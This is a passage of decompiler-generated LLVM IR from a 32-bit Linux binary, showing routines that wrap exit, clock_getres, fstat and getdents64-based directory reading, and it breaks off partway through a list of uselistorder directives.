  %v0_805443a = phi i32 [ %v7_8054422, %dec_label_pc_8054405 ], [ -1, %dec_label_pc_805442e ]
  store i32 %v2_805443d, i32* @esi, align 4
  ret i32 %v0_805443a

; uselistorder directives
  uselistorder i32 %v7_8054422, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805443a, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8054440(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8054440:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8054468(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054468:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054468 = load i32, i32* @ebx, align 4
  store i32 %v0_8054468, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805447b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805447b, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_805447b, -4095
  br i1 %tmp10, label %dec_label_pc_8054494, label %dec_label_pc_8054488

dec_label_pc_8054488:                             ; preds = %dec_label_pc_8054468
  %v1_8054488 = call i32 @function_8052719(i32 %v0_8054468)
  %v0_805448d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805448d = sub i32 0, %v0_805448d
  %v2_805448f = inttoptr i32 %v1_8054488 to i32*
  store i32 %v1_805448d, i32* %v2_805448f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054498.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054494

dec_label_pc_8054494:                             ; preds = %dec_label_pc_8054468, %dec_label_pc_8054488
  %v2_8054498 = phi i32 [ %v0_8054468, %dec_label_pc_8054468 ], [ %v2_8054498.pre, %dec_label_pc_8054488 ]
  %v0_8054494 = phi i32 [ %v4_805447b, %dec_label_pc_8054468 ], [ -1, %dec_label_pc_8054488 ]
  %v2_8054496 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054496, i32* @edx, align 4
  store i32 %v2_8054498, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054494

; uselistorder directives
  uselistorder i32 %v4_805447b, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054494, { 1, 0 }
}

define i32 @function_805449a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805449a:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805449a = load i32, i32* @ebx, align 4
  store i32 %v0_805449a, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_80544ad = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_80544ad, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_80544ad, -4095
  br i1 %tmp13, label %dec_label_pc_80544c8, label %dec_label_pc_80544ba

dec_label_pc_80544ba:                             ; preds = %dec_label_pc_805449a
  %v1_80544ba = call i32 @function_8052719(i32 %v0_805449a)
  %v0_80544bf = load i32, i32* @ebx, align 4
  %v1_80544bf = sub i32 0, %v0_80544bf
  %v2_80544c1 = inttoptr i32 %v1_80544ba to i32*
  store i32 %v1_80544bf, i32* %v2_80544c1, align 4
  %v2_80544e0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80544db

dec_label_pc_80544c8:                             ; preds = %dec_label_pc_805449a
  %v1_80544c8 = icmp eq i32 %v4_80544ad, 0
  %v1_80544ca = icmp eq i1 %v1_80544c8, false
  br i1 %v1_80544ca, label %dec_label_pc_80544db, label %dec_label_pc_80544cc

dec_label_pc_80544cc:                             ; preds = %dec_label_pc_80544c8
  %v4_80544d3 = bitcast i32* %stack_var_-68 to i16*
  %v5_80544d3 = call i32 @function_80548e5(i16* %v4_80544d3, i32 %arg2, i32 %v4_80544ad, i32 %v4_80544ad)
  %v0_80544db.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80544db

dec_label_pc_80544db:                             ; preds = %dec_label_pc_80544c8, %dec_label_pc_80544ba, %dec_label_pc_80544cc
  %v2_80544e0 = phi i32 [ %v0_805449a, %dec_label_pc_80544c8 ], [ %v2_80544e0.pre, %dec_label_pc_80544ba ], [ %v0_805449a, %dec_label_pc_80544cc ]
  %v0_80544db = phi i32 [ %v4_80544ad, %dec_label_pc_80544c8 ], [ -1, %dec_label_pc_80544ba ], [ %v0_80544db.pre, %dec_label_pc_80544cc ]
  store i32 %v2_80544e0, i32* @ebx, align 4
  ret i32 %v0_80544db

; uselistorder directives
  uselistorder i32 %v4_80544ad, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80544db, { 2, 0, 1 }
}

define i32 @function_80544e2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80544e2:
  %eax.global-to-local = alloca i32, align 4
  %v0_80544e2 = load i32, i32* @edi, align 4
  %v0_80544e3 = load i32, i32* @esi, align 4
  %v0_80544e4 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_80544e9 = load i32, i32* @edx, align 4
  %v7_80544f3 = inttoptr i32 %arg2 to i32*
  %v8_80544f3 = call i32 @function_8054551(i32 %arg1, i32* %v7_80544f3, i32 %arg3, i32 %v0_80544e9, i32 %v0_80544e4, i32 %v0_80544e3, i32 %v0_80544e2)
  store i32 %v8_80544f3, i32* %eax.global-to-local, align 4
  store i32 %v8_80544f3, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_80544f3, 1
  br i1 %tmp24, label %dec_label_pc_805454b, label %dec_label_pc_8054501

dec_label_pc_8054501:                             ; preds = %dec_label_pc_80544e2
  %v0_8054501 = load i32, i32* @ebx, align 4
  %v2_8054501 = add i32 %v0_8054501, %v8_80544f3
  store i32 %v2_8054501, i32* @edi, align 4
  %v7_80545474 = icmp ult i32 %v0_8054501, %v2_8054501
  br i1 %v7_80545474, label %dec_label_pc_8054506, label %dec_label_pc_805454b

dec_label_pc_8054506:                             ; preds = %dec_label_pc_8054501, %dec_label_pc_8054506
  %v0_8054506 = phi i32 [ %v2_8054545, %dec_label_pc_8054506 ], [ %v0_8054501, %dec_label_pc_8054501 ]
  %v1_8054506 = add i32 %v0_8054506, 8
  %v2_8054506 = inttoptr i32 %v1_8054506 to i32*
  %v3_8054506 = load i32, i32* %v2_8054506, align 4
  store i32 %v3_8054506, i32* %eax.global-to-local, align 4
  %v2_8054509 = add i32 %v0_8054506, 4
  %v3_8054509 = inttoptr i32 %v2_8054509 to i32*
  store i32 %v3_8054506, i32* %v3_8054509, align 4
  %v0_805450c = load i32, i32* @ebx, align 4
  %v1_805450c = add i32 %v0_805450c, 16
  %v2_805450c = inttoptr i32 %v1_805450c to i32*
  %v3_805450c = load i32, i32* %v2_805450c, align 4
  store i32 %v3_805450c, i32* %eax.global-to-local, align 4
  %v1_805450f = trunc i32 %v3_805450c to i16
  %v3_805450f = add i32 %v0_805450c, 8
  %v4_805450f = inttoptr i32 %v3_805450f to i16*
  store i16 %v1_805450f, i16* %v4_805450f, align 2
  %v0_8054513 = load i32, i32* @ebx, align 4
  %v1_8054513 = add i32 %v0_8054513, 18
  %v2_8054513 = inttoptr i32 %v1_8054513 to i8*
  %v3_8054513 = load i8, i8* %v2_8054513, align 1
  %v4_8054513 = zext i8 %v3_8054513 to i32
  %v5_8054513 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054513 = and i32 %v5_8054513, -256
  %v7_8054513 = or i32 %v6_8054513, %v4_8054513
  store i32 %v7_8054513, i32* %eax.global-to-local, align 4
  %v3_8054516 = add i32 %v0_8054513, 10
  %v4_8054516 = inttoptr i32 %v3_8054516 to i8*
  store i8 %v3_8054513, i8* %v4_8054516, align 1
  %v0_805451a = load i32, i32* @ebx, align 4
  %v1_805451a = add i32 %v0_805451a, 8
  %v2_805451a = inttoptr i32 %v1_805451a to i16*
  %v3_805451a = load i16, i16* %v2_805451a, align 2
  %v4_805451a = zext i16 %v3_805451a to i32
  %v1_805451e = add nsw i32 %v4_805451a, -19
  %v1_8054522 = add i32 %v0_805451a, 19
  %v1_8054526 = add i32 %v0_805451a, 11
  store i32 %v1_8054526, i32* %eax.global-to-local, align 4
  %v3_805452a = inttoptr i32 %v1_8054526 to i8*
  %v4_805452a = call i32 @function_8052743(i8* %v3_805452a, i32 %v1_8054522, i32 %v1_805451e)
  store i32 %v4_805452a, i32* %eax.global-to-local, align 4
  %v0_8054532 = load i32, i32* @ebx, align 4
  %v1_8054532 = add i32 %v0_8054532, 8
  %v2_8054532 = inttoptr i32 %v1_8054532 to i16*
  %v3_8054532 = load i16, i16* %v2_8054532, align 2
  %v4_8054532 = zext i16 %v3_8054532 to i32
  store i32 %v4_8054532, i32* %eax.global-to-local, align 4
  %v3_8054539 = inttoptr i32 %v0_8054532 to i8*
  %v4_8054539 = call i32 @function_8052743(i8* %v3_8054539, i32 %v0_8054532, i32 %v4_8054532)
  store i32 %v4_8054539, i32* %eax.global-to-local, align 4
  %v0_805453e = load i32, i32* @ebx, align 4
  %v1_805453e = add i32 %v0_805453e, 8
  %v2_805453e = inttoptr i32 %v1_805453e to i16*
  %v3_805453e = load i16, i16* %v2_805453e, align 2
  %v4_805453e = zext i16 %v3_805453e to i32
  store i32 %v4_805453e, i32* %eax.global-to-local, align 4
  %v2_8054545 = add i32 %v4_805453e, %v0_805453e
  store i32 %v2_8054545, i32* @ebx, align 4
  %v1_8054547 = load i32, i32* @edi, align 4
  %v7_8054547 = icmp ult i32 %v2_8054545, %v1_8054547
  br i1 %v7_8054547, label %dec_label_pc_8054506, label %dec_label_pc_8054547.dec_label_pc_805454b.loopexit_crit_edge

dec_label_pc_8054547.dec_label_pc_805454b.loopexit_crit_edge: ; preds = %dec_label_pc_8054506
  %v0_805454b.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805454b

dec_label_pc_805454b:                             ; preds = %dec_label_pc_8054501, %dec_label_pc_8054547.dec_label_pc_805454b.loopexit_crit_edge, %dec_label_pc_80544e2
  %v0_805454b = phi i32 [ %v8_80544f3, %dec_label_pc_80544e2 ], [ %v0_805454b.pre.pre, %dec_label_pc_8054547.dec_label_pc_805454b.loopexit_crit_edge ], [ %v8_80544f3, %dec_label_pc_8054501 ]
  store i32 %v0_805454b, i32* %eax.global-to-local, align 4
  store i32 %v0_80544e3, i32* @esi, align 4
  store i32 %v0_80544e2, i32* @edi, align 4
  ret i32 %v0_805454b

; uselistorder directives
  uselistorder i32 %v0_805454b, { 1, 0 }
  uselistorder i32 %v2_8054545, { 1, 2, 0 }
  uselistorder i32 %v0_8054532, { 1, 0, 2 }
  uselistorder i32 %v0_805451a, { 1, 0, 2 }
  uselistorder i32 %v0_8054506, { 1, 0 }
  uselistorder i32 %v0_8054501, { 0, 2, 1 }
  uselistorder i32 %v8_80544f3, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_8052743, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 11, { 13, 11, 12, 18, 7, 4, 8, 5, 9, 6, 10, 0, 1, 14, 15, 16, 17, 2, 3, 19, 20 }
  uselistorder label %dec_label_pc_805454b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054506, { 1, 0 }
}

define i32 @function_8054551(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8054551:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8054554 = load i32, i32* @edi, align 4
  %v0_8054556 = load i32, i32* @ebx, align 4
  %v15_8054557 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8054560 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_8054566 = and i32 %v1_8054560, -16
  %v2_8054569 = sub i32 %v15_8054557, %v1_8054566
  %v1_805456b = add i32 %v2_8054569, 15
  %v1_805456f = and i32 %v1_805456b, -16
  %v1_8054575 = inttoptr i32 %v1_805456f to %linux_dirent64*
  store i32 %v1_805456f, i32* %ecx.global-to-local, align 4
  %v2_8054577 = add i32 %v2_8054569, -4
  %v3_8054577 = inttoptr i32 %v2_8054577 to i32*
  store i32 %v0_8054556, i32* %v3_8054577, align 4
  %v0_8054578 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_805457f = call i32 @getdents64(i32 %v0_8054578, %linux_dirent64* %v1_8054575, i32 %arg3)
  store i32 %v5_805457f, i32* %eax.global-to-local, align 4
  %v0_8054581 = load i32, i32* @esp, align 4
  %v3_8054581 = add i32 %v0_8054581, 4
  %tmp41 = icmp ult i32 %v5_805457f, -4095
  br i1 %tmp41, label %dec_label_pc_805459b, label %dec_label_pc_805458c

dec_label_pc_805458c:                             ; preds = %dec_label_pc_8054551
  %v1_805458c = call i32 @function_8052719(i32 %v5_805457f)
  store i32 %v1_805458c, i32* %eax.global-to-local, align 4
  %v4_8054591 = sub i32 0, %v5_805457f
  store i32 %v4_8054591, i32* @edx, align 4
  %v2_8054597 = inttoptr i32 %v1_805458c to i32*
  store i32 %v4_8054591, i32* %v2_8054597, align 4
  br label %dec_label_pc_805465d

dec_label_pc_805459b:                             ; preds = %dec_label_pc_8054551
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_805456f, i32* @ebx, align 4
  %v5_805464d = add i32 %v5_805457f, %v1_805456f
  store i32 %v5_805464d, i32* %eax.global-to-local, align 4
  %v7_805465030 = icmp ult i32 %v1_805456f, %v5_805464d
  br i1 %v7_805465030, label %dec_label_pc_80545ba.lr.ph, label %dec_label_pc_8054658

dec_label_pc_80545ba.lr.ph:                       ; preds = %dec_label_pc_805459b
  %v5_80545c7 = add i32 %tmp14, %arg3
  br label %dec_label_pc_80545ba

dec_label_pc_80545ba:                             ; preds = %dec_label_pc_80545ba.lr.ph, %dec_label_pc_80545fc
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_80545ba.lr.ph ], [ %v3_80545ff, %dec_label_pc_80545fc ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_80545ba.lr.ph ], [ %v3_80545fc, %dec_label_pc_80545fc ]
  %v0_805460834 = phi i32 [ %v1_805456f, %dec_label_pc_80545ba.lr.ph ], [ %v2_8054645, %dec_label_pc_80545fc ]
  %v1_805460d33 = phi i32 [ %tmp14, %dec_label_pc_80545ba.lr.ph ], [ %v2_80545ca, %dec_label_pc_80545fc ]
  %v0_80545d432 = phi i32 [ %v3_8054581, %dec_label_pc_80545ba.lr.ph ], [ %v1_8054647, %dec_label_pc_80545fc ]
  %v1_80545ba = add i32 %v0_805460834, 16
  %v2_80545ba = inttoptr i32 %v1_80545ba to i16*
  %v3_80545ba = load i16, i16* %v2_80545ba, align 2
  %v4_80545ba = zext i16 %v3_80545ba to i32
  %v1_80545be = add nuw nsw i32 %v4_80545ba, 3
  %v1_80545c4 = and i32 %v1_80545be, 131068
  store i32 %v1_80545c4, i32* %ecx.global-to-local, align 4
  store i32 %v5_80545c7, i32* %eax.global-to-local, align 4
  %v2_80545ca = add i32 %v1_80545c4, %v1_805460d33
  %tmp42 = icmp ugt i32 %v2_80545ca, %v5_80545c7
  br i1 %tmp42, label %dec_label_pc_80545d4, label %dec_label_pc_80545fc

dec_label_pc_80545d4:                             ; preds = %dec_label_pc_80545ba
  %v1_80545d4 = add i32 %v0_80545d432, -4
  %v2_80545d4 = inttoptr i32 %v1_80545d4 to i32*
  store i32 0, i32* %v2_80545d4, align 4
  %v5_80545d6 = add i32 %v0_80545d432, -8
  %v6_80545d6 = inttoptr i32 %v5_80545d6 to i32*
  store i32 %stack_var_-32.036, i32* %v6_80545d6, align 4
  %v5_80545d9 = add i32 %v0_80545d432, -12
  %v6_80545d9 = inttoptr i32 %v5_80545d9 to i32*
  store i32 %stack_var_-36.035, i32* %v6_80545d9, align 4
  %v5_80545dc = add i32 %v0_80545d432, -16
  %v6_80545dc = inttoptr i32 %v5_80545dc to i32*
  store i32 %arg1, i32* %v6_80545dc, align 4
  %v1_80545df = call i32 @function_8054767(i32 %v2_80545ca)
  store i32 %v1_80545df, i32* %eax.global-to-local, align 4
  %v0_80545e7 = load i32, i32* @esi, align 4
  %v15_80545e7 = icmp eq i32 %v0_80545e7, %tmp14
  %v1_80545ea = icmp eq i1 %v15_80545e7, false
  br i1 %v1_80545ea, label %dec_label_pc_8054658, label %dec_label_pc_80545ec

dec_label_pc_80545ec:                             ; preds = %dec_label_pc_80545d4
  %v1_80545ec = call i32 @function_8052719(i32 %v2_80545ca)
  store i32 %v1_80545ec, i32* %eax.global-to-local, align 4
  %v1_80545f1 = inttoptr i32 %v1_80545ec to i32*
  store i32 22, i32* %v1_80545f1, align 4
  br label %dec_label_pc_805465d

dec_label_pc_80545fc:                             ; preds = %dec_label_pc_80545ba
  %v1_80545fc = add i32 %v0_805460834, 8
  %v2_80545fc = inttoptr i32 %v1_80545fc to i32*
  %v3_80545fc = load i32, i32* %v2_80545fc, align 4
  store i32 %v3_80545fc, i32* %eax.global-to-local, align 4
  %v1_80545ff = add i32 %v0_805460834, 12
  %v2_80545ff = inttoptr i32 %v1_80545ff to i32*
  %v3_80545ff = load i32, i32* %v2_80545ff, align 4
  %v1_8054608 = inttoptr i32 %v0_805460834 to i32*
  %v2_8054608 = load i32, i32* %v1_8054608, align 4
  store i32 %v2_8054608, i32* %eax.global-to-local, align 4
  %v1_805460a = add i32 %v0_805460834, 4
  %v2_805460a = inttoptr i32 %v1_805460a to i32*
  %v3_805460a = load i32, i32* %v2_805460a, align 4
  %v2_805460d = add i32 %v1_805460d33, 4
  %v3_805460d = inttoptr i32 %v2_805460d to i32*
  store i32 %v3_805460a, i32* %v3_805460d, align 4
  %v0_8054610 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054610 = load i32, i32* @esi, align 4
  %v2_8054610 = inttoptr i32 %v1_8054610 to i32*
  store i32 %v0_8054610, i32* %v2_8054610, align 4
  %v0_8054612 = load i32, i32* @ebx, align 4
  %v1_8054612 = add i32 %v0_8054612, 8
  %v2_8054612 = inttoptr i32 %v1_8054612 to i32*
  %v3_8054612 = load i32, i32* %v2_8054612, align 4
  store i32 %v3_8054612, i32* %eax.global-to-local, align 4
  %v1_8054615 = add i32 %v0_8054612, 12
  %v2_8054615 = inttoptr i32 %v1_8054615 to i32*
  %v3_8054615 = load i32, i32* %v2_8054615, align 4
  store i32 %v3_8054615, i32* @edx, align 4
  %v1_8054618 = load i32, i32* @esi, align 4
  %v2_8054618 = add i32 %v1_8054618, 12
  %v3_8054618 = inttoptr i32 %v2_8054618 to i32*
  store i32 %v3_8054615, i32* %v3_8054618, align 4
  %v0_805461b = load i32, i32* %eax.global-to-local, align 4
  %v1_805461b = load i32, i32* @esi, align 4
  %v2_805461b = add i32 %v1_805461b, 8
  %v3_805461b = inttoptr i32 %v2_805461b to i32*
  store i32 %v0_805461b, i32* %v3_805461b, align 4
  %v0_805461e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805461e = trunc i32 %v0_805461e to i16
  %v2_805461e = load i32, i32* @esi, align 4
  %v3_805461e = add i32 %v2_805461e, 16
  %v4_805461e = inttoptr i32 %v3_805461e to i16*
  store i16 %v1_805461e, i16* %v4_805461e, align 2
  %v0_8054622 = load i32, i32* @ebx, align 4
  %v1_8054622 = add i32 %v0_8054622, 18
  %v2_8054622 = inttoptr i32 %v1_8054622 to i8*
  %v3_8054622 = load i8, i8* %v2_8054622, align 1
  %v4_8054622 = zext i8 %v3_8054622 to i32
  %v5_8054622 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054622 = and i32 %v5_8054622, -256
  %v7_8054622 = or i32 %v6_8054622, %v4_8054622
  store i32 %v7_8054622, i32* %eax.global-to-local, align 4
  %v2_8054625 = load i32, i32* @esi, align 4
  %v3_8054625 = add i32 %v2_8054625, 18
  %v4_8054625 = inttoptr i32 %v3_8054625 to i8*
  store i8 %v3_8054622, i8* %v4_8054625, align 1
  %v0_8054628 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054628 = load i32, i32* @esp, align 4
  %v2_8054628 = add i32 %v1_8054628, -4
  %v3_8054628 = inttoptr i32 %v2_8054628 to i32*
  store i32 %v0_8054628, i32* %v3_8054628, align 4
  %v0_8054629 = load i32, i32* @ebx, align 4
  %v1_8054629 = add i32 %v0_8054629, 16
  %v2_8054629 = inttoptr i32 %v1_8054629 to i16*
  %v3_8054629 = load i16, i16* %v2_8054629, align 2
  %v4_8054629 = zext i16 %v3_8054629 to i32
  %v1_805462d = add nsw i32 %v4_8054629, -19
  %v2_8054630 = add i32 %v1_8054628, -8
  %v3_8054630 = inttoptr i32 %v2_8054630 to i32*
  store i32 %v1_805462d, i32* %v3_8054630, align 4
  %v0_8054631 = load i32, i32* @ebx, align 4
  %v1_8054631 = add i32 %v0_8054631, 19
  %v2_8054634 = add i32 %v1_8054628, -12
  %v3_8054634 = inttoptr i32 %v2_8054634 to i32*
  store i32 %v1_8054631, i32* %v3_8054634, align 4
  %v0_8054635 = load i32, i32* @esi, align 4
  %v1_8054635 = add i32 %v0_8054635, 19
  store i32 %v1_8054635, i32* %eax.global-to-local, align 4
  %v2_8054638 = add i32 %v1_8054628, -16
  %v3_8054638 = inttoptr i32 %v2_8054638 to i32*
  store i32 %v1_8054635, i32* %v3_8054638, align 4
  %v3_8054639 = inttoptr i32 %v2_80545ca to i16*
  %v4_8054639 = call i32 @function_8054962(i16* %v3_8054639, i32 %v3_80545fc, i32 %v3_80545ff)
  store i32 %v4_8054639, i32* %eax.global-to-local, align 4
  %v0_805463e = load i32, i32* @ebx, align 4
  %v1_805463e = add i32 %v0_805463e, 16
  %v2_805463e = inttoptr i32 %v1_805463e to i16*
  %v3_805463e = load i16, i16* %v2_805463e, align 2
  %v4_805463e = zext i16 %v3_805463e to i32
  store i32 %v2_80545ca, i32* @esi, align 4
  %v2_8054645 = add i32 %v4_805463e, %v0_805463e
  store i32 %v2_8054645, i32* @ebx, align 4
  %v0_8054647 = load i32, i32* @esp, align 4
  %v1_8054647 = add i32 %v0_8054647, 16
  store i32 %v5_805464d, i32* %eax.global-to-local, align 4
  %v7_8054650 = icmp ult i32 %v2_8054645, %v5_805464d
  br i1 %v7_8054650, label %dec_label_pc_80545ba, label %dec_label_pc_8054658

dec_label_pc_8054658:                             ; preds = %dec_label_pc_805459b, %dec_label_pc_80545fc, %dec_label_pc_80545d4
  %v0_8054658 = phi i32 [ %v0_80545e7, %dec_label_pc_80545d4 ], [ %tmp14, %dec_label_pc_805459b ], [ %v2_80545ca, %dec_label_pc_80545fc ]
  store i32 %v0_8054658, i32* %eax.global-to-local, align 4
  %v5_805465a = sub i32 %v0_8054658, %tmp14
  br label %dec_label_pc_805465d

dec_label_pc_805465d:                             ; preds = %dec_label_pc_80545ec, %dec_label_pc_805458c, %dec_label_pc_8054658
  %storemerge = phi i32 [ %v5_805465a, %dec_label_pc_8054658 ], [ -1, %dec_label_pc_805458c ], [ -1, %dec_label_pc_80545ec ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8054556, i32* @ebx, align 4
  store i32 %v0_8054554, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8054658, { 1, 0 }
  uselistorder i32 %v2_8054645, { 0, 2, 1 }
  uselistorder i32 %v3_80545ff, { 1, 0 }
  uselistorder i32 %v3_80545fc, { 1, 2, 0 }
  uselistorder i32 %v2_80545ca, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_80545d432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805460834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_805464d, { 2, 3, 0, 1 }
  uselistorder i32 %v5_805457f, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 4, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 2, 7, 5, 0, 6 }
  uselistorder i32 (i16*, i32, i32)* @function_8054962, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 19, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 18, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 22, { 13, 14, 5, 6, 7, 15, 3, 4, 8, 9, 10, 11, 12, 0, 1, 2 }
  uselistorder i32 -12, { 17, 37, 93, 94, 21, 22, 50, 51, 52, 53, 39, 18, 45, 48, 49, 46, 43, 20, 41, 19, 38, 47, 23, 54, 55, 44, 42, 40, 24, 56, 57, 25, 26, 58, 59, 60, 61, 62, 36, 27, 32, 29, 28, 66, 67, 0, 68, 1, 2, 86, 81, 82, 83, 33, 34, 80, 35, 84, 85, 69, 3, 4, 30, 31, 5, 70, 71, 6, 7, 72, 8, 73, 9, 10, 74, 11, 75, 12, 13, 76, 14, 77, 15, 78, 79, 63, 64, 65, 87, 88, 89, 90, 91, 16, 92 }
  uselistorder i32 -8, { 0, 8, 80, 76, 78, 77, 79, 81, 82, 22, 23, 24, 25, 26, 27, 10, 11, 17, 20, 21, 18, 15, 2, 13, 1, 9, 19, 28, 29, 30, 16, 14, 12, 3, 31, 32, 4, 33, 34, 35, 36, 37, 38, 73, 5, 58, 45, 6, 42, 43, 44, 68, 62, 63, 64, 59, 60, 61, 65, 66, 67, 46, 47, 7, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 39, 40, 41, 69, 70, 71, 72, 74, 75 }
  uselistorder i32* @esp, { 193, 194, 195, 6, 7, 8, 9, 10, 331, 332, 0, 53, 54, 55, 56, 57, 58, 59, 60, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 11, 123, 15, 125, 126, 127, 106, 107, 128, 129, 130, 131, 132, 94, 95, 96, 97, 98, 43, 44, 45, 46, 47, 89, 90, 91, 92, 93, 99, 100, 102, 103, 134, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 48, 49, 50, 51, 52, 133, 78, 79, 80, 81, 82, 83, 84, 77, 85, 86, 87, 88, 101, 104, 105, 120, 121, 122, 135, 136, 137, 14, 163, 162, 138, 139, 140, 141, 142, 143, 124, 144, 145, 146, 147, 148, 149, 158, 159, 160, 150, 151, 152, 153, 154, 155, 156, 157, 12, 161, 1, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 2, 3, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 16, 213, 17, 214, 18, 215, 19, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 20, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 265, 264, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 297, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 4, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 22, 333, 334, 335, 336, 327, 328, 329, 330, 27, 337, 338, 339, 340, 26, 345, 346, 347, 348, 37, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 341, 342, 343, 344, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 28, 374, 375, 376, 38, 377, 378, 379, 380, 381, 382, 383, 385, 384, 5, 386, 387, 388, 389, 390, 391, 392, 393, 25, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 36, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 21, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 30, 29, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 31, 457, 458, 459, 460, 461, 462, 463, 32, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 33, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 34, 484, 485, 35, 486, 487, 488, 489, 490, 491, 492, 493, 494, 24, 39, 495, 496, 497, 498, 499, 500, 501, 40, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 